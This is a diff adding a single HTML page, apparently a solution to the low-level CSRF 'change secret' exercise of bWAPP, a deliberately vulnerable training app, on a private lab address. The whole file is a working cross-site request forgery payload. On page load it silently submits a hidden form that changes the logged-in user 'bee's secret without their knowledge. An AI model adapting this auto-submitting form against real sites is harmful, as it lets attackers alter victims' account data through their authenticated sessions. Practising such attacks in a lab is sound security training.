@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>CSRF Change Secret Low</title>
+</head>
+<body onload="document.getElementById('csrf').submit();">
+	<!-- Over GET -->
+	<br />
+	<br />
+	<form id="csrf" method="GET" action="http://192.168.1.58/BWAPP/csrf_3.php">
+		<input name="secret" type="hidden" value="SECRET" />
+		<input name="login" type="hidden" value="bee" />
+		<input name="action" type="hidden" value="change" />
+	</form>
+	<br />
+	<br />
+</body>
+</html>
